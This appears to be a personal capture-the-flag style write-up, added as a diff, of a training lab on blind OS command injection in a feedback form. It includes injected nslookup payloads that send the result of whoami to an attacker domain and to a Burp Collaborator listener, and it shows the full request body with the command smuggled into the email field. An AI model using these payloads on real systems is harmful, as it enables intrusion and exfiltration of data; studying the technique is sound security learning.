@@ -1,0 +1,72 @@
+# Lab Blind OS command injection with out-of-band data exfiltration
+
+## Objective:
+ This lab contains a blind OS command injection vulnerability in the feedback function.
+
+The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 
+
+## Big Idea:
+
+The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:
+
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+
+This will cause a DNS lookup to the attacker's domain containing the result of the whoami command 
+
+wwwuser.kgji2ohoyw.web-attacker.com
+
+
+-----------------------------------
+
+This is what the lab welcome page looks like
+
+![[Pasted image 20210923211500.png]]
+
+Visiting the "Submit feedback" link responds to the following page. 
+
+Looks Juicy!
+
+![[Pasted image 20210923211536.png]]
+
+One of these values is vulnerable to command injection. This is when user input parameters in a website can force the application to execute commands. 
+
+I sent the following, and intercepted the request with Burp Intercept. 
+
+![[Pasted image 20210923211735.png]]
+
+![[Pasted image 20210923211810.png]]
+
+I will attack the "email" value
+
+First, since this is data exfil lab, I need to setup a listener for the exfiltrated data. Burp Collaborator is a function that comes with Burp Pro. It gives me a unique domain, and listens for any DNS or web requests and outputs those requests to my Burp Collaboartor client. It is great for testing out of band techniques. 
+
+To start burp collaborator, go to Burp > Burp Collaborator Client
+
+![[Pasted image 20210923212129.png]]
+
+This started a listener and gave me the following domain.
+nzqyy86k404hxyr4tkwv45bk6bc10q.burpcollaborator.net
+
+Now, going back to the command injection, I want to have the target execute the following command
+
+`nslookup $(whoami).nzqyy86k404hxyr4tkwv45bk6bc10q.burpcollaborator.net`
+
+That will send a dns query containing the user that the web application is running as. 
+
+I will inject that command in the email parameter
+
+`nslookup $(whoami).nzqyy86k404hxyr4tkwv45bk6bc10q.burpcollaborator.net`
+
+This is what the body looked like after injecting the above payload into the email parameter.
+
+csrf=6b9o9YhnDAT4GIcsE94GZQ8UUgHDTRCU&name=bagelHacks&email=bagelHacks%2540hacker.hacker`nslookup+$(whoami).nzqyy86k404hxyr4tkwv45bk6bc10q.burpcollaborator.net`&subject=test&message=testing
+
+![[Pasted image 20210923212641.png]]
+
+After sending the command, I received a DNS query containing the username of "peter-8i7dNd" on my Burp Collaborator client
+
+![[Pasted image 20210923212713.png]]
+
+![[Pasted image 20210923212839.png]]
